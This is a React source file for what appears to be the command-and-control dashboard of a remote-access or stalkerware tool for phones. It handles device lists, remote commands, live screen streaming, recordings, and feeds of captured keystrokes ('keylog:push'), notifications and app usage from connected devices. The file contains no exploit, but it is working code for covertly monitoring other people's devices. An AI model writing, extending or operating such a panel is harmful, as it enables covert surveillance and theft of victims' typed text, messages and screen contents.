import React, { useState, useCallback, useRef, useEffect } from 'react';
import { useWebSocket } from './hooks/useWebSocket.js';
import Sidebar from './components/Sidebar.jsx';
import DeviceControl from './components/DeviceControl.jsx';
import Overview from './components/Overview.jsx';
import StatusBar from './components/StatusBar.jsx';
import Login from './components/Login.jsx';
import './App.css';

function useAdminAuth() {
  const [authed, setAuthed] = useState(null);

  useEffect(() => {
    const token = localStorage.getItem('admin_token');
    if (!token) { setAuthed(false); return; }
    fetch('/api/admin/verify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token }),
    })
      .then(r => r.json())
      .then(d => setAuthed(!!d.success))
      .catch(() => setAuthed(false));
  }, []);

  const logout = () => {
    localStorage.removeItem('admin_token');
    setAuthed(false);
  };

  return { authed, setAuthed, logout };
}

export default function App() {
  const { authed, setAuthed, logout } = useAdminAuth();

  if (authed === null) {
    return (
      <div style={{ display:'flex', alignItems:'center', justifyContent:'center', height:'100vh', background:'var(--bg-primary,#0f0f1a)', color:'#fff' }}>
        Verifying session…
      </div>
    );
  }

  if (!authed) {
    return <Login onLogin={() => setAuthed(true)} />;
  }

  return <AuthenticatedApp logout={logout} />;
}

function AuthenticatedApp({ logout }) {
  const [devices, setDevices] = useState([]);
  const [selectedDevice, setSelectedDevice] = useState(null);
  const [commandResults, setCommandResults] = useState([]);
  const [pendingCommands, setPendingCommands] = useState({});
  const [activityLog, setActivityLog] = useState([]);
  const [streamFrames, setStreamFrames] = useState({});
  const [keylogPushEntries, setKeylogPushEntries] = useState([]);
  const [notifPushEntries, setNotifPushEntries] = useState([]);
  const [activityAppEntries, setActivityAppEntries] = useState([]);

  // ── Latency tracking ──────────────────────────────────────────────────
  // serverLatency: dashboard ↔ server RTT in ms (null = not yet measured)
  // deviceLatencies: { [deviceId]: ms } — command round-trip for each device
  const [serverLatency, setServerLatency] = useState(null);
  const [deviceLatencies, setDeviceLatencies] = useState({});
  // Tracks {commandId → {deviceId, sentAt}} for ping commands in flight
  const pingPendingRef = useRef({});

  const handleMessage = useCallback((event, data) => {
    switch (event) {
      case 'device:list':
        setDevices(Array.isArray(data) ? data : []);
        break;

      case 'device:connected':
        setActivityLog(prev => [{
          id: Date.now(),
          type: 'connect',
          text: `Device connected: ${data.deviceId}`,
          time: new Date()
        }, ...prev].slice(0, 100));
        // Merge full deviceInfo (including screenWidth/screenHeight) into the device list
        if (data.deviceId && data.deviceInfo) {
          setDevices(prev => {
            const exists = prev.find(d => d.deviceId === data.deviceId);
            if (exists) {
              return prev.map(d => d.deviceId === data.deviceId
                ? { ...d, isOnline: true, deviceInfo: { ...(d.deviceInfo || {}), ...data.deviceInfo } }
                : d);
            }
            return [...prev, { deviceId: data.deviceId, deviceName: data.deviceInfo.name || data.deviceId,
                               deviceInfo: data.deviceInfo, isOnline: true }];
          });
        }
        break;

      case 'device:disconnected':
        setActivityLog(prev => [{
          id: Date.now(),
          type: 'disconnect',
          text: `Device disconnected: ${data.deviceId}`,
          time: new Date()
        }, ...prev].slice(0, 100));
        setDevices(prev =>
          prev.map(d => d.deviceId === data.deviceId ? { ...d, isOnline: false } : d)
        );
        break;

      case 'device:heartbeat':
        setDevices(prev =>
          prev.map(d => d.deviceId === data.deviceId ? { ...d, isOnline: true, lastSeen: data.timestamp } : d)
        );
        break;

      case 'command:sent':
        setPendingCommands(prev => ({ ...prev, [data.commandId]: data }));
        // If we have a pending probe sentAt for this device+ping, promote to commandId key
        if (data.command === 'ping' && data.deviceId) {
          const pendingKey = `__pending_${data.deviceId}`;
          if (pingPendingRef.current[pendingKey] !== undefined) {
            pingPendingRef.current[data.commandId] = { deviceId: data.deviceId, sentAt: pingPendingRef.current[pendingKey] };
            delete pingPendingRef.current[pendingKey];
          }
        }
        break;

      case 'dashboard:pong': {
        if (data?.sentAt) {
          setServerLatency(Date.now() - data.sentAt);
        }
        break;
      }

      case 'command:result': {
        setPendingCommands(prev => {
          const next = { ...prev };
          delete next[data.commandId];
          return next;
        });
        // If this was a latency-ping command, record device RTT
        if (data.commandId && pingPendingRef.current[data.commandId]) {
          const { deviceId, sentAt } = pingPendingRef.current[data.commandId];
          delete pingPendingRef.current[data.commandId];
          setDeviceLatencies(prev => ({ ...prev, [deviceId]: Date.now() - sentAt }));
        }
        const result = {
          id: data.commandId || Date.now(),
          command: data.command,
          deviceId: data.deviceId,
          success: data.success,
          response: data.response,
          error: data.error,
          time: new Date()
        };
        setCommandResults(prev => [result, ...prev].slice(0, 200));
        setActivityLog(prev => [{
          id: Date.now(),
          type: data.success ? 'success' : 'error',
          text: `${data.command} → ${data.success ? 'OK' : data.error}`,
          time: new Date()
        }, ...prev].slice(0, 100));
        break;
      }

      case 'command:error':
        setCommandResults(prev => [{
          id: Date.now(),
          command: data.command || 'unknown',
          deviceId: data.deviceId,
          success: false,
          error: data.message,
          time: new Date()
        }, ...prev].slice(0, 200));
        break;

      case 'stream:frame':
        if (data.deviceId && data.frameData) {
          setStreamFrames(prev => ({ ...prev, [data.deviceId]: data.frameData }));
          // Failsafe: update screen dimensions from each frame if not already set
          if (data.screenWidth && data.screenHeight) {
            setDevices(prev => prev.map(d => {
              if (d.deviceId !== data.deviceId) return d;
              const existing = d.deviceInfo || {};
              if (existing.screenWidth === data.screenWidth && existing.screenHeight === data.screenHeight) return d;
              return { ...d, deviceInfo: { ...existing, screenWidth: data.screenWidth, screenHeight: data.screenHeight } };
            }));
          }
        }
        break;

      case 'keylog:push':
        if (data && data.deviceId) {
          setKeylogPushEntries(prev => [{ ...data, _pushId: Date.now() + Math.random() }, ...prev].slice(0, 500));
        }
        break;

      case 'notification:push':
        if (data && data.deviceId) {
          setNotifPushEntries(prev => [{ ...data, _pushId: Date.now() + Math.random() }, ...prev].slice(0, 500));
        }
        break;

      case 'activity:app_open':
        if (data && data.deviceId) {
          setActivityAppEntries(prev => {
            if (prev.length && prev[0].packageName === data.packageName && prev[0].deviceId === data.deviceId) return prev;
            return [{ ...data, _pushId: Date.now() + Math.random() }, ...prev].slice(0, 200);
          });
        }
        break;

      case 'recording:started':
      case 'recording:saved':
      case 'recording:error':
        break;

      default:
        break;
    }
  }, []);

  const { connected, reconnecting, send } = useWebSocket(handleMessage);

  const sendCommand = useCallback((deviceId, command, params = null) => {
    send('command:send', { deviceId, command, params });
  }, [send]);

  // ── Periodic server latency ping (every 5 s) ──────────────────────────
  useEffect(() => {
    if (!connected) return;
    const tick = () => send('dashboard:ping', { sentAt: Date.now() });
    tick(); // immediate first ping
    const id = setInterval(tick, 5000);
    return () => clearInterval(id);
  }, [connected, send]);

  // ── Periodic device latency ping (every 10 s per selected device) ────
  const sendDevicePing = useCallback((deviceId) => {
    const sentAt = Date.now();
    // Use a pseudo-commandId: the server returns command:sent with the real one
    // We intercept via command:sent to capture the actual commandId
    send('command:send', { deviceId, command: 'ping', params: null, _latencyProbe: true });
    // Store sentAt keyed by deviceId; updated when command:sent arrives
    pingPendingRef.current[`__pending_${deviceId}`] = sentAt;
  }, [send]);

  useEffect(() => {
    if (!connected || !selectedDevice) return;
    const tick = () => sendDevicePing(selectedDevice);
    tick();
    const id = setInterval(tick, 10000);
    return () => clearInterval(id);
  }, [connected, selectedDevice, sendDevicePing]);

  return (
    <div className="app">
      <StatusBar connected={connected} reconnecting={reconnecting} deviceCount={devices.filter(d => d.isOnline).length} onLogout={logout} />
      <div className="app-body">
        <Sidebar
          devices={devices}
          selectedDevice={selectedDevice}
          onSelectDevice={setSelectedDevice}
        />
        <main className="main-content">
          {selectedDevice ? (
            <DeviceControl
              device={devices.find(d => d.deviceId === selectedDevice) || { deviceId: selectedDevice }}
              sendCommand={sendCommand}
              results={commandResults.filter(r => r.deviceId === selectedDevice)}
              pending={Object.values(pendingCommands).filter(c => c.deviceId === selectedDevice)}
              onBack={() => setSelectedDevice(null)}
              streamFrame={streamFrames[selectedDevice] || null}
              send={send}
              keylogPushEntries={keylogPushEntries.filter(e => e.deviceId === selectedDevice)}
              notifPushEntries={notifPushEntries.filter(e => e.deviceId === selectedDevice)}
              activityAppEntries={activityAppEntries.filter(e => e.deviceId === selectedDevice)}
              serverLatency={serverLatency}
              deviceLatency={deviceLatencies[selectedDevice] ?? null}
            />
          ) : (
            <Overview
              devices={devices}
              activityLog={activityLog}
              onSelectDevice={setSelectedDevice}
              connected={connected}
            />
          )}
        </main>
      </div>
    </div>
  );
}
